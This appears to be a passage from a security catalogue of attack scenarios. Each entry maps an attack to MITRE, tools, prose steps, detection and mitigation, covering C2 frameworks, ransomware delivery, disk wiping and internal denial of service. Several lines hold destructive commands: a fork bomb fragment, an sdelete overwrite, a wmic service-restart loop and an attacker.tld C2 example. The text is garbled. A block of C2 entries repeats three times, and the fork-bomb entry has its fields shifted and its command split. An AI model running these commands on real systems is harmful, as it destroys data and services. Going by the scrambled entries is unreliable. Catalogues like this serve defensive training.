- **MITRE**: T1071.001
- **Impact**: Remote shell over encrypted HTTPS
- **Tools**: Cobalt Strike
- **Scenario**: Stealth C2 established using HTTPS to mimic browser traffic.
- **Attack Steps**: The attacker first sets up a team server in Cobalt Strike with HTTPS beacon configuration. They generate a malicious payload configured to connect back to the team server on port 443 using HTTPS. The payload is embedded inside a macro-enabled Office document, which is sent via phishing to the target. Upon user execution, the beacon initiates encrypted communication with the C2, blending into normal HTTPS traffic. The beacon is configured with random jitter intervals, sleep cycles, and User-Agent rotation to mimic real browser behavior. Once active, the attacker uses the Cobalt Strike console to send commands and receive output through these covert HTTPS sessions, maintaining persistent access.
- **Detection**: JA3/SNI/TLS fingerprinting and long session detection
- **Solution**: Use network anomaly detection and behavior-based EDR
- **Tags**: cobalt strike, https, beacon

## DNS Tunneling via Iodine

- **Attack Type**: Command and Control → DNS-Based Data Exchange
- **Target**: Windows Host
- **Vulnerability**: DNS egress not filtered or inspected
- **MITRE**: T1071.004
- **Impact**: Covert C2 bypassing proxies
- **Tools**: Iodine
- **Scenario**: Establishes C2 using DNS queries to bypass outbound filtering.
- **Attack Steps**: After compromising the target, the attacker sets up an authoritative DNS server for a registered domain (e.g., attacker.tld). The Iodine tool is deployed on the victim’s host. The implant uses TXT records to encode and send command-and-control traffic by querying subdomains such as abc123.attacker.tld. These DNS queries are routed via the organization’s DNS resolver and eventually reach the attacker’s nameserver. The attacker responds using manipulated TXT records that the implant parses to execute commands. This communication is stealthy because it masquerades as legitimate DNS traffic, which typically isn’t monitored or blocked in enterprise networks.
- **Detection**: Monitor excessive or anomalous DNS TXT traffic
- **Solution**: Implement DNS tunneling detection and alerting tools
- **Tags**: dns, tunneling, iodine

## Empire Listener Over HTTP

- **Attack Type**: Command and Control → Web C2 Using Agent Handlers
- **Target**: Windows Host
- **Vulnerability**: PowerShell not restricted, HTTP allowed
- **MITRE**: T1071.001
- **Impact**: Persistent remote access with low visibility
- **Tools**: Empire
- **Scenario**: Uses HTTP listener to serve PowerShell agents.
- **Attack Steps**: The attacker configures an HTTP listener in Empire and generates a PowerShell stager payload. This payload is often embedded in a macro, LNK file, or served via a phishing webpage. Once executed on the victim machine, the stager reaches out to the Empire listener using an HTTP GET request to retrieve the agent script. All future communication happens over HTTP POST requests with commands and output being base64 encoded. The attacker controls the victim host using Empire’s agent framework, executing commands, capturing keystrokes, and exfiltrating data, all via disguised HTTP requests. To evade detection, the attacker modifies HTTP headers to impersonate legitimate browsers and uses randomized URLs for beaconing.
- **Detection**: Detect base64 payloads in HTTP POST requests
- **Solution**: Block PowerShell web access; use script block logging
- **Tags**: empire, http, powershell

## Sliver Implant Over HTTP/2

- **Attack Type**: Command and Control → Sliver Implant via Stealth HTTP2
- **Target**: Web-Exposed Host
- **Vulnerability**: HTTP/2 supported but unmonitored
- **MITRE**: T1071.001
- **Impact**: Long-lived encrypted channel
- **Tools**: Sliver Framework
- **Scenario**: Sliver payload leverages HTTP/2 tunneling for evasion.
- **Attack Steps**: The attacker uses the Sliver framework to create a C2 listener that supports HTTP/2. A Sliver implant is compiled with randomized metadata and signed with a self-signed certificate to appear legitimate. It is then dropped onto the victim machine via a vulnerability exploit or lateral movement. The implant initiates communication with the listener using HTTP/2 over port 443, taking advantage of the fact that many detection tools don't properly parse HTTP/2 traffic. The attacker issues commands encoded in protobuf, which the implant decodes and executes. Output is similarly encoded and returned. The HTTP/2 connection disguises the traffic as browser-originated, helping the attacker remain undetected during data collection and pivoting.
- **Detection**: Inspect HTTP/2 headers and flow anomalies
- **Solution**: Use TLS interception and advanced DPI
- **Tags**: sliver, http2, protobuf

## Metasploit Reverse HTTPS Payload

- **Attack Type**: Command and Control → HTTPS Shell Access via Meterpreter
- **Target**: Windows Machine
- **Vulnerability**: Delivered payload successfully executed
- **MITRE**: T1059.001
- **Impact**: Full remote control via encrypted shell
- **Tools**: Metasploit
- **Scenario**: Backdoor installed using reverse HTTPS payload.
- **Attack Steps**: The attacker uses msfvenom to generate a reverse HTTPS Meterpreter payload and hosts a multi-handler on the attacker's system using Metasploit. This payload is delivered through phishing, USB drop, or exploit. Once executed, the victim system initiates a TLS handshake to the attacker's listener, mimicking legitimate browser traffic on port 443. The Meterpreter session allows full control: the attacker can browse files, take screenshots, record keystrokes, and escalate privileges. The HTTPS channel is encrypted, making inspection difficult. Metasploit’s automation features allow persistence to be established quickly using registry keys or scheduled tasks.
- **Detection**: TLS-based beacon monitoring and heuristics
- **Solution**: Block execution of unsigned binaries and restrict HTTPS egress
- **Tags**: metasploit, meterpreter, reverse shell

## Beacon Over HTTPS via Cobalt Strike

- **Attack Type**: Command and Control → HTTPS Beaconing
- **Target**: Enterprise Workstation
- **Vulnerability**: User opens malicious document
- **MITRE**: T1071.001
- **Impact**: Remote shell over encrypted HTTPS
- **Tools**: Cobalt Strike
- **Scenario**: Stealth C2 established using HTTPS to mimic browser traffic.
- **Attack Steps**: The attacker first sets up a team server in Cobalt Strike with HTTPS beacon configuration. They generate a malicious payload configured to connect back to the team server on port 443 using HTTPS. The payload is embedded inside a macro-enabled Office document, which is sent via phishing to the target. Upon user execution, the beacon initiates encrypted communication with the C2, blending into normal HTTPS traffic. The beacon is configured with random jitter intervals, sleep cycles, and User-Agent rotation to mimic real browser behavior. Once active, the attacker uses the Cobalt Strike console to send commands and receive output through these covert HTTPS sessions, maintaining persistent access.
- **Detection**: JA3/SNI/TLS fingerprinting and long session detection
- **Solution**: Use network anomaly detection and behavior-based EDR
- **Tags**: cobalt strike, https, beacon

## DNS Tunneling via Iodine

- **Attack Type**: Command and Control → DNS-Based Data Exchange
- **Target**: Windows Host
- **Vulnerability**: DNS egress not filtered or inspected
- **MITRE**: T1071.004
- **Impact**: Covert C2 bypassing proxies
- **Tools**: Iodine
- **Scenario**: Establishes C2 using DNS queries to bypass outbound filtering.
- **Attack Steps**: After compromising the target, the attacker sets up an authoritative DNS server for a registered domain (e.g., attacker.tld). The Iodine tool is deployed on the victim’s host. The implant uses TXT records to encode and send command-and-control traffic by querying subdomains such as abc123.attacker.tld. These DNS queries are routed via the organization’s DNS resolver and eventually reach the attacker’s nameserver. The attacker responds using manipulated TXT records that the implant parses to execute commands. This communication is stealthy because it masquerades as legitimate DNS traffic, which typically isn’t monitored or blocked in enterprise networks.
- **Detection**: Monitor excessive or anomalous DNS TXT traffic
- **Solution**: Implement DNS tunneling detection and alerting tools
- **Tags**: dns, tunneling, iodine

## Empire Listener Over HTTP

- **Attack Type**: Command and Control → Web C2 Using Agent Handlers
- **Target**: Windows Host
- **Vulnerability**: PowerShell not restricted, HTTP allowed
- **MITRE**: T1071.001
- **Impact**: Persistent remote access with low visibility
- **Tools**: Empire
- **Scenario**: Uses HTTP listener to serve PowerShell agents.
- **Attack Steps**: The attacker configures an HTTP listener in Empire and generates a PowerShell stager payload. This payload is often embedded in a macro, LNK file, or served via a phishing webpage. Once executed on the victim machine, the stager reaches out to the Empire listener using an HTTP GET request to retrieve the agent script. All future communication happens over HTTP POST requests with commands and output being base64 encoded. The attacker controls the victim host using Empire’s agent framework, executing commands, capturing keystrokes, and exfiltrating data, all via disguised HTTP requests. To evade detection, the attacker modifies HTTP headers to impersonate legitimate browsers and uses randomized URLs for beaconing.
- **Detection**: Detect base64 payloads in HTTP POST requests
- **Solution**: Block PowerShell web access; use script block logging
- **Tags**: empire, http, powershell

## Sliver Implant Over HTTP/2

- **Attack Type**: Command and Control → Sliver Implant via Stealth HTTP2
- **Target**: Web-Exposed Host
- **Vulnerability**: HTTP/2 supported but unmonitored
- **MITRE**: T1071.001
- **Impact**: Long-lived encrypted channel
- **Tools**: Sliver Framework
- **Scenario**: Sliver payload leverages HTTP/2 tunneling for evasion.
- **Attack Steps**: The attacker uses the Sliver framework to create a C2 listener that supports HTTP/2. A Sliver implant is compiled with randomized metadata and signed with a self-signed certificate to appear legitimate. It is then dropped onto the victim machine via a vulnerability exploit or lateral movement. The implant initiates communication with the listener using HTTP/2 over port 443, taking advantage of the fact that many detection tools don't properly parse HTTP/2 traffic. The attacker issues commands encoded in protobuf, which the implant decodes and executes. Output is similarly encoded and returned. The HTTP/2 connection disguises the traffic as browser-originated, helping the attacker remain undetected during data collection and pivoting.
- **Detection**: Inspect HTTP/2 headers and flow anomalies
- **Solution**: Use TLS interception and advanced DPI
- **Tags**: sliver, http2, protobuf

## Metasploit Reverse HTTPS Payload

- **Attack Type**: Command and Control → HTTPS Shell Access via Meterpreter
- **Target**: Windows Machine
- **Vulnerability**: Delivered payload successfully executed
- **MITRE**: T1059.001
- **Impact**: Full remote control via encrypted shell
- **Tools**: Metasploit
- **Scenario**: Backdoor installed using reverse HTTPS payload.
- **Attack Steps**: The attacker uses msfvenom to generate a reverse HTTPS Meterpreter payload and hosts a multi-handler on the attacker's system using Metasploit. This payload is delivered through phishing, USB drop, or exploit. Once executed, the victim system initiates a TLS handshake to the attacker's listener, mimicking legitimate browser traffic on port 443. The Meterpreter session allows full control: the attacker can browse files, take screenshots, record keystrokes, and escalate privileges. The HTTPS channel is encrypted, making inspection difficult. Metasploit’s automation features allow persistence to be established quickly using registry keys or scheduled tasks.
- **Detection**: TLS-based beacon monitoring and heuristics
- **Solution**: Block execution of unsigned binaries and restrict HTTPS egress
- **Tags**: metasploit, meterpreter, reverse shell

## Simulated Ransomware Drop via Phishing Campaign

- **Attack Type**: Execution → Ransomware Deployment
- **Target**: Office PC
- **Vulnerability**: User interaction + attachment execution
- **MITRE**: T1486
- **Impact**: Local data rendered inaccessible
- **Tools**: Custom Python Ransomware, Outlook
- **Scenario**: Simulated ransomware delivery and encryption test via email attachment.
- **Attack Steps**: The attacker sends a socially engineered phishing email with a ZIP attachment labeled as "HR_Policy_Update". Inside, a malicious executable disguised as a PDF reader is embedded. When executed, it runs a Python-based ransomware script that encrypts files in Documents, Desktop, and AppData directories using AES encryption and appends a .locked extension. A ransom note is dropped to all folders. Encryption keys are transmitted to a remote server via HTTP POST.
- **Detection**: Monitor file rename and high I/O patterns
- **Solution**: Block ZIPs containing executables
- **Tags**: ransomware, phishing

## Ransomware Deployment via Exploited RDP Access

- **Attack Type**: Lateral Movement → Ransomware via Remote Desktop
- **Target**: Windows Server
- **Vulnerability**: RDP access + poor segmentation
- **MITRE**: T1021.001
- **Impact**: Broad organizational data encrypted
- **Tools**: RDP, Mimikatz, PowerShell
- **Scenario**: Attacker leverages weak RDP creds to deploy ransomware.
- **Attack Steps**: The attacker scans the internal network and discovers an exposed RDP endpoint with weak credentials. Using RDP, they log into a privileged server and drop a PowerShell script that downloads ransomware from a hosted web server. Upon execution, the script disables shadow copies, kills backup services, and encrypts user directories. The script spreads the ransomware to mapped network drives and shared folders.
- **Detection**: Audit RDP logons, alert lateral PS usage
- **Solution**: Disable RDP or use MFA
- **Tags**: rdp, ransomware

## Drive-by Download Triggering Ransomware

- **Attack Type**: Initial Access → Ransomware via Malicious Webpage
- **Target**: Web Browser
- **Vulnerability**: Drive-by + user execution
- **MITRE**: T1189
- **Impact**: Immediate lockout of user files
- **Tools**: Browser Exploit Kit, ZIP Loader
- **Scenario**: Website delivers hidden ransomware payload.
- **Attack Steps**: The attacker compromises a WordPress blog and injects malicious JavaScript. Victims visiting the site unknowingly download an HTA file. When opened, it launches a ZIP loader that silently extracts and runs a ransomware binary. It scans the disk for user files, encrypts them using RSA+AES combo, and modifies the wallpaper with ransom instructions. The binary deletes itself and uses WMI to hide artifacts.
- **Detection**: Alert on HTA execution and archive extract
- **Solution**: Use browser isolation, block HTA files
- **Tags**: drive-by, ransomware, hta

## USB Drop-Based Ransomware Infection

- **Attack Type**: Execution → Ransomware via Physical Access
- **Target**: Workstation
- **Vulnerability**: Autorun + human curiosity
- **MITRE**: T1204.002
- **Impact**: Social-engineered full data lock
- **Tools**: Rubber Ducky, Hidden Tear
- **Scenario**: USB with autorun malware triggers encryption upon insertion.
- **Attack Steps**: The attacker drops infected USBs in a parking lot near the target company. A curious employee inserts the USB, which emulates keystrokes using a Rubber Ducky to launch a hidden ransomware payload. The payload begins encrypting files silently and uploads the key to a remote pastebin endpoint. Files across the system are renamed, and the desktop wallpaper changes to a ransom note demanding Bitcoin.
- **Detection**: USB insertion + autorun script logs
- **Solution**: Disable USBs, user awareness training
- **Tags**: usb drop, ransomware

## Payload Execution via MS Office Macro

- **Attack Type**: Execution → Ransomware via Macro Abuse
- **Target**: Office Laptop
- **Vulnerability**: Enabled macros in Office
- **MITRE**: T1059.005
- **Impact**: Mass file encryption with notes
- **Tools**: Excel Macro, AES Script
- **Scenario**: Macro runs obfuscated ransomware on open.
- **Attack Steps**: A crafted .xlsm file is sent to employees labeled as "Payroll Summary." When opened and macros are enabled, the embedded VBA downloads a hidden ransomware script from a remote C2. This script enumerates files recursively, encrypts content, and appends a .payme extension. Recovery tools are disabled and ransom notes are generated in each folder.
- **Detection**: Detect web calls from Excel processes
- **Solution**: Block macros via GPO
- **Tags**: macro, office, ransomware

## Supply Chain Exploit for Ransomware Delivery

- **Attack Type**: Initial Access → Ransomware via Software Update
- **Target**: Corporate Endpoint
- **Vulnerability**: Software supply chain compromise
- **MITRE**: T1195.002
- **Impact**: Massive scale attack via trusted source
- **Tools**: Signed Updater Trojan
- **Scenario**: Signed update mechanism used to push ransomware.
- **Attack Steps**: Attacker compromises the update server of a third-party tool used by the organization. They inject ransomware into a legitimate update binary. Once the target's software checks for updates, the tampered package is downloaded and executed. Ransomware installs as a service and encrypts important directories with a time delay to avoid early detection.
- **Detection**: Monitor update sources + binary hashes
- **Solution**: Verify code signing and vendor authenticity
- **Tags**: supply chain, update, ransomware

## Scheduled Task Triggers Ransomware Deployment

- **Attack Type**: Persistence → Timed Ransomware Launch
- **Target**: Server
- **Vulnerability**: Task scheduler access post-persistence
- **MITRE**: T1053.005
- **Impact**: Timed encryption + log tampering
- **Tools**: schtasks, AES Tool
- **Scenario**: Attacker schedules delayed ransomware via task.
- **Attack Steps**: Post-exploitation, the attacker uses schtasks to schedule ransomware execution for off-hours. The binary is copied to a hidden directory, and a task is created to execute it every Sunday at midnight. This ensures encryption hits during non-working hours. A log wiper runs before execution.
- **Detection**: Audit task creations, odd runtimes
- **Solution**: Restrict schtasks to admins
- **Tags**: ransomware, scheduled

## Ransomware Spread via GPO Push

- **Attack Type**: Lateral Movement → GPO-Based Mass Ransomware
- **Target**: Enterprise Network
- **Vulnerability**: Full domain compromise
- **MITRE**: T1484.001
- **Impact**: Enterprise-wide encryption in minutes
- **Tools**: Group Policy Editor, PS Script
- **Scenario**: Uses GPO to deliver ransomware across domain.
- **Attack Steps**: Attacker gains Domain Admin access. They create a GPO that pushes a PowerShell-based ransomware executable to all machines on login. The GPO also disables Windows Defender and modifies registry settings to block recovery. On next user login, the ransomware encrypts local drives, shows a ransom prompt, and disables services like Shadow Copy and Volume Backup.
- **Detection**: Monitor GPO changes by non-admins
- **Solution**: Secure DC access, alert GPO edits
- **Tags**: gpo, ransomware, domain

## Beacon Over HTTPS via Cobalt Strike

- **Attack Type**: Command and Control → HTTPS Beaconing
- **Target**: Enterprise Workstation
- **Vulnerability**: User opens malicious document
- **MITRE**: T1071.001
- **Impact**: Remote shell over encrypted HTTPS
- **Tools**: Cobalt Strike
- **Scenario**: Stealth C2 established using HTTPS to mimic browser traffic.
- **Attack Steps**: The attacker first sets up a team server in Cobalt Strike with HTTPS beacon configuration. They generate a malicious payload configured to connect back to the team server on port 443 using HTTPS. The payload is embedded inside a macro-enabled Office document, which is sent via phishing to the target. Upon user execution, the beacon initiates encrypted communication with the C2, blending into normal HTTPS traffic. The beacon is configured with random jitter intervals, sleep cycles, and User-Agent rotation to mimic real browser behavior. Once active, the attacker uses the Cobalt Strike console to send commands and receive output through these covert HTTPS sessions, maintaining persistent access.
- **Detection**: JA3/SNI/TLS fingerprinting and long session detection
- **Solution**: Use network anomaly detection and behavior-based EDR
- **Tags**: cobalt strike, https, beacon

## DNS Tunneling via Iodine

- **Attack Type**: Command and Control → DNS-Based Data Exchange
- **Target**: Windows Host
- **Vulnerability**: DNS egress not filtered or inspected
- **MITRE**: T1071.004
- **Impact**: Covert C2 bypassing proxies
- **Tools**: Iodine
- **Scenario**: Establishes C2 using DNS queries to bypass outbound filtering.
- **Attack Steps**: After compromising the target, the attacker sets up an authoritative DNS server for a registered domain (e.g., attacker.tld). The Iodine tool is deployed on the victim’s host. The implant uses TXT records to encode and send command-and-control traffic by querying subdomains such as abc123.attacker.tld. These DNS queries are routed via the organization’s DNS resolver and eventually reach the attacker’s nameserver. The attacker responds using manipulated TXT records that the implant parses to execute commands. This communication is stealthy because it masquerades as legitimate DNS traffic, which typically isn’t monitored or blocked in enterprise networks.
- **Detection**: Monitor excessive or anomalous DNS TXT traffic
- **Solution**: Implement DNS tunneling detection and alerting tools
- **Tags**: dns, tunneling, iodine

## Empire Listener Over HTTP

- **Attack Type**: Command and Control → Web C2 Using Agent Handlers
- **Target**: Windows Host
- **Vulnerability**: PowerShell not restricted, HTTP allowed
- **MITRE**: T1071.001
- **Impact**: Persistent remote access with low visibility
- **Tools**: Empire
- **Scenario**: Uses HTTP listener to serve PowerShell agents.
- **Attack Steps**: The attacker configures an HTTP listener in Empire and generates a PowerShell stager payload. This payload is often embedded in a macro, LNK file, or served via a phishing webpage. Once executed on the victim machine, the stager reaches out to the Empire listener using an HTTP GET request to retrieve the agent script. All future communication happens over HTTP POST requests with commands and output being base64 encoded. The attacker controls the victim host using Empire’s agent framework, executing commands, capturing keystrokes, and exfiltrating data, all via disguised HTTP requests. To evade detection, the attacker modifies HTTP headers to impersonate legitimate browsers and uses randomized URLs for beaconing.
- **Detection**: Detect base64 payloads in HTTP POST requests
- **Solution**: Block PowerShell web access; use script block logging
- **Tags**: empire, http, powershell

## Sliver Implant Over HTTP/2

- **Attack Type**: Command and Control → Sliver Implant via Stealth HTTP2
- **Target**: Web-Exposed Host
- **Vulnerability**: HTTP/2 supported but unmonitored
- **MITRE**: T1071.001
- **Impact**: Long-lived encrypted channel
- **Tools**: Sliver Framework
- **Scenario**: Sliver payload leverages HTTP/2 tunneling for evasion.
- **Attack Steps**: The attacker uses the Sliver framework to create a C2 listener that supports HTTP/2. A Sliver implant is compiled with randomized metadata and signed with a self-signed certificate to appear legitimate. It is then dropped onto the victim machine via a vulnerability exploit or lateral movement. The implant initiates communication with the listener using HTTP/2 over port 443, taking advantage of the fact that many detection tools don't properly parse HTTP/2 traffic. The attacker issues commands encoded in protobuf, which the implant decodes and executes. Output is similarly encoded and returned. The HTTP/2 connection disguises the traffic as browser-originated, helping the attacker remain undetected during data collection and pivoting.
- **Detection**: Inspect HTTP/2 headers and flow anomalies
- **Solution**: Use TLS interception and advanced DPI
- **Tags**: sliver, http2, protobuf

## Metasploit Reverse HTTPS Payload

- **Attack Type**: Command and Control → HTTPS Shell Access via Meterpreter
- **Target**: Windows Machine
- **Vulnerability**: Delivered payload successfully executed
- **MITRE**: T1059.001
- **Impact**: Full remote control via encrypted shell
- **Tools**: Metasploit
- **Scenario**: Backdoor installed using reverse HTTPS payload.
- **Attack Steps**: The attacker uses msfvenom to generate a reverse HTTPS Meterpreter payload and hosts a multi-handler on the attacker's system using Metasploit. This payload is delivered through phishing, USB drop, or exploit. Once executed, the victim system initiates a TLS handshake to the attacker's listener, mimicking legitimate browser traffic on port 443. The Meterpreter session allows full control: the attacker can browse files, take screenshots, record keystrokes, and escalate privileges. The HTTPS channel is encrypted, making inspection difficult. Metasploit’s automation features allow persistence to be established quickly using registry keys or scheduled tasks.
- **Detection**: TLS-based beacon monitoring and heuristics
- **Solution**: Block execution of unsigned binaries and restrict HTTPS egress
- **Tags**: metasploit, meterpreter, reverse shell

## Data Wipe via Diskpart Command

- **Attack Type**: Impact → Data Wiping or Corruption
- **Target**: Server or Endpoint
- **Vulnerability**: Admin shell access
- **MITRE**: T1561.001
- **Impact**: Irreversible data destruction
- **Tools**: Diskpart, Batch Script
- **Scenario**: Disk partitions wiped using native disk utilities.
- **Attack Steps**: The attacker gains privileged access and creates a malicious batch script that invokes diskpart commands to select and clean system and backup drives. The script is either run manually or scheduled as a task, and upon execution, it immediately erases disk partitions, resulting in complete data loss. To prevent recovery, the script includes commands to write null bytes to disk space post-wipe.
- **Detection**: Monitor diskpart or sudden partition changes
- **Solution**: Limit use of disk utilities and alert high-risk commands
- **Tags**: disk wipe, native tools

## Boot Sector Overwrite Using Raw Disk Access

- **Attack Type**: Impact → Data Wiping or Corruption
- **Target**: Workstation
- **Vulnerability**: Full disk write access
- **MITRE**: T1561.002
- **Impact**: System unbootable, total halt
- **Tools**: WinAPI, Custom C
- **Scenario**: Boot sector modified to prevent OS boot.
- **Attack Steps**: Using C and Windows APIs for raw disk access, attacker writes over the Master Boot Record (MBR) of the disk, corrupting the bootloader. Upon system reboot, the machine fails to boot, displaying a black screen or error. A timed payload may delay execution to evade detection.
- **Detection**: Alert on direct MBR/boot writes
- **Solution**: Enforce application whitelisting and restrict disk access APIs
- **Tags**: boot overwrite, mbr, bricking

## Data Corruption Using SDelete with Forced Zero Writes

- **Attack Type**: Impact → Data Wiping or Corruption
- **Target**: Server
- **Vulnerability**: SYSTEM privileges and SDelete access
- **MITRE**: T1070.004
- **Impact**: Secure erasure of logs/data
- **Tools**: Sysinternals SDelete
- **Scenario**: Uses SDelete tool to irreversibly wipe sensitive data.
- **Attack Steps**: Post-exfiltration, the attacker launches sdelete.exe -p 5 -z to overwrite sensitive directories. The command securely deletes files and fills free space with zeroes to erase residual data. The tool is run from a hidden scheduled task with SYSTEM privileges. This not only wipes targeted content but also prevents recovery via forensic tools.
- **Detection**: Detect unauthorized SDelete execution
- **Solution**: Block known data erasure tools
- **Tags**: sdelete, data wipe

## Network Share Wipe via Automated Script

- **Attack Type**: Impact → Data Wiping or Corruption
- **Target**: Enterprise Network
- **Vulnerability**: Open shares and PowerShell allowed
- **MITRE**: T1485
- **Impact**: Mass loss of collaborative assets
- **Tools**: PowerShell, UNC Paths
- **Scenario**: Script loops through shared drives and deletes contents.
- **Attack Steps**: Attacker enumerates shared drives via net view and Get-SmbShare. A PowerShell script is crafted to traverse each UNC path, delete contents using Remove-Item, and clear shadow copies if present. The script is obfuscated and dropped via scheduled tasks. It wipes project directories, backups, and collaborative folders across the network.
- **Detection**: Monitor high-volume deletes on shares
- **Solution**: Restrict write access to critical shares
- **Tags**: shares, wipe, network

## Ransomware Variant with Data Corruption Routine

- **Attack Type**: Impact → Data Wiping or Corruption
- **Target**: Desktop Environment
- **Vulnerability**: Executable launch with write access
- **MITRE**: T1485
- **Impact**: Operational disruption and sabotage
- **Tools**: Custom Ransomware Binary
- **Scenario**: Malware corrupts files instead of encrypting.
- **Attack Steps**: A modified ransomware is deployed which scans for targeted file extensions but instead of encryption, it overwrites files with junk binary data. No ransom note is left, only corrupted content. This attack aims at disruption rather than financial gain. Executed via phishing or persistence mechanism.
- **Detection**: Alert on high I/O + junk content patterns
- **Solution**: App whitelisting and recovery strategies
- **Tags**: corruption, ransomware, sabotage

## Internal SYN Flood from Compromised Host

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Internal Web Server
- **Vulnerability**: Unrestricted internal traffic + no rate limiting
- **MITRE**: T1499
- **Impact**: Server downtime, halts employee access to services
- **Tools**: hping3, nping
- **Scenario**: Attacker initiates SYN flood on internal web app server, exhausting connection table.
- **Attack Steps**: Once inside the network, the attacker uses hping3 to craft thousands of SYN packets per second toward the internal web server on port 443. The server, expecting ACK responses, holds these half-open connections in memory, quickly maxing out its TCP backlog queue. This results in slowdowns and eventual unavailability for legitimate users. The attack is launched from a compromised employee system using random source IPs to obfuscate origin and prevent easy traceback.
- **Detection**: Monitor for abnormal TCP connection rates
- **Solution**: Use internal traffic rate limiting + firewall rules
- **Tags**: syn flood, dos, internal

## DNS Amplification via Misconfigured Resolver

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: DNS Resolver, App Server
- **Vulnerability**: Open resolver + lack of ingress filtering
- **MITRE**: T1499.004
- **Impact**: Network-level exhaustion of internal services
- **Tools**: dig, dnsperf
- **Scenario**: Exploits internal open DNS resolver to overload application server.
- **Attack Steps**: The attacker identifies an internally reachable DNS resolver (e.g., 10.0.0.53) that responds to any recursive query. From a compromised internal host, they spoof UDP DNS requests using the victim application server's IP. Each small request triggers a large DNS response (amplification factor ~30x). Repeated high-volume requests overload the app server’s NIC and CPU, causing service instability and packet drops.
- **Detection**: Monitor spikes in DNS response size and source IP mismatches
- **Solution**: Disable open DNS recursion and validate internal traffic
- **Tags**: dns, udp, amplification

## SMB Service Crash via Invalid Packet Flood

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: File Server
- **Vulnerability**: Outdated SMB version susceptible to malformed input
- **MITRE**: T1499.001
- **Impact**: File sharing halted for all departments
- **Tools**: Metasploit, custom script
- **Scenario**: Sends malformed SMB packets to crash file server’s SMB process.
- **Attack Steps**: Using Metasploit's auxiliary/dos/windows/smb/ms17_010_pings, the attacker targets a vulnerable internal file server. A flood of malformed packets is sent, exploiting improper buffer handling in the SMB service. The SMB process (srvsvc.dll) crashes repeatedly, causing Windows to auto-restart the service until it fails completely. Shared drives become inaccessible across the department.
- **Detection**: Event log correlation with SMB crashes
- **Solution**: Patch SMB stack; isolate file servers
- **Tags**: smb, malformed packet, crash

## Print Spooler Exploitation for Service Exhaustion

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Print Server
- **Vulnerability**: Unrestricted job queuing with no user verification
- **MITRE**: T1499.003
- **Impact**: Business process disruption due to halted printing
- **Tools**: PowerSploit, PowerShell
- **Scenario**: Repeated fake print jobs exhaust internal print queue and spooler memory.
- **Attack Steps**: Attacker uses PowerShell to send dozens of high-resolution fake print jobs to the internal print server every few seconds. These are crafted to use massive page counts and heavy images. The print spooler service's job queue fills rapidly, consuming available disk and memory. This causes the spooler to crash repeatedly or refuse new jobs, halting legitimate printing tasks across the company. The attack targets the shared print infrastructure and persists using scheduled jobs.
- **Detection**: Monitor print queue size and submission rate
- **Solution**: Implement print job throttling and user access controls
- **Tags**: printer, spooler, dos

## ARP Flood Attack in Local Subnet

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Internal LAN Devices
- **Vulnerability**: Lack of ARP rate limiting and cache verification
- **MITRE**: T1499.001
- **Impact**: LAN-level communication blackout
- **Tools**: ettercap, arpspoof
- **Scenario**: Attacker floods the LAN with spoofed ARP replies to poison caches and freeze traffic.
- **Attack Steps**: From a compromised laptop inside the network, the attacker runs arpspoof to flood the local network with fake ARP responses claiming to be both the gateway and several key internal IPs. This poisons the ARP caches of multiple devices simultaneously, causing them to route traffic to the wrong MAC or broadcast it indefinitely. The resulting broadcast storm cripples internal communications, leaving employees disconnected or facing severe latency.
- **Detection**: Monitor MAC/IP inconsistencies and sudden ARP floods
- **Solution**: Enable dynamic ARP inspection and port security
- **Tags**: arp, spoofing, lan dos

## WMI Abuse to Crash Remote Services

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Internal Windows Server
- **Vulnerability**: WMI abuse with excessive privileges
- **MITRE**: T1499
- **Impact**: Unstable critical business services
- **Tools**: WMIC, PsExec
- **Scenario**: Uses WMI to invoke repeated service restarts on critical systems.
- **Attack Steps**: After lateral movement, attacker targets a key internal service (e.g., HR portal) and repeatedly restarts its Windows service remotely using WMI: wmic /node:"HRServer" service where name="HRAppSvc" call stopservice and startservice. These actions loop every few seconds using a script, causing instability and race conditions in dependent applications. The portal becomes unusable due to repeated reinitializations, corrupting some logs and active sessions.
- **Detection**: Detect WMI service invocation loops
- **Solution**: Limit remote service control rights via GPO
- **Tags**: wmi, dos, service abuse

## CPU Exhaustion via Fork Bomb in UNIX Systems

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: :& };:`) via shell. This command recursively spawns child processes, quickly overwhelming CPU and RAM. The system becomes unresponsive within seconds, and legitimate users cannot SSH, use cron jobs, or access mounted shares. Recovery requires hard reboot.
- **Vulnerability**: Linux Server
- **MITRE**: No limits on user process count
- **Impact**: T1499
- **Tools**: bash
- **Scenario**: Attacker triggers fork bomb on Linux server to consume CPU and crash processes.
- **Attack Steps**: Gaining access to an internal Linux server (e.g., file or backup server), the attacker executes a fork bomb (`:(){ :
- **Detection**: Complete server unresponsiveness
- **Solution**: Track surge in process counts and CPU usage
- **Tags**: Use ulimit to restrict per-user processes

## DHCP Starvation Attack

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Internal DHCP Server
- **Vulnerability**: Unrestricted MAC assignment, no DHCP snooping
- **MITRE**: T1499.001
- **Impact**: Network service disruption
- **Tools**: Yersinia, DHCPig
- **Scenario**: Exhausts available IP addresses by flooding DHCP requests using spoofed MACs.
- **Attack Steps**: The attacker plugs into the internal LAN using a rogue laptop or compromised host. They execute a DHCP starvation attack by launching a tool like Yersinia or DHCPig, which sends a continuous stream of DHCP discovery packets, each with a randomized spoofed MAC address. The DHCP server, seeing each as a new client, allocates IP addresses to every request until the pool is fully exhausted. As a result, legitimate users trying to connect to the network are unable to get IP addresses, effectively locking out systems from network services. This causes widespread disruption across departments and requires manual DHCP pool reset or server remediation.
- **Detection**: Monitor for high volume of DHCP requests from a single host
- **Solution**: Enable DHCP snooping, limit MAC addresses per port
- **Tags**: dhcp, starvation, dos

## Internal NTP Amplification Flood

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Internal NTP Servers
- **Vulnerability**: NTP monlist enabled, no ingress spoofing detection
- **MITRE**: T1499.004
- **Impact**: Internal application downtime
- **Tools**: NTP Reflection Scripts, nping
- **Scenario**: Uses internal NTP servers to reflect and amplify traffic, flooding internal systems.
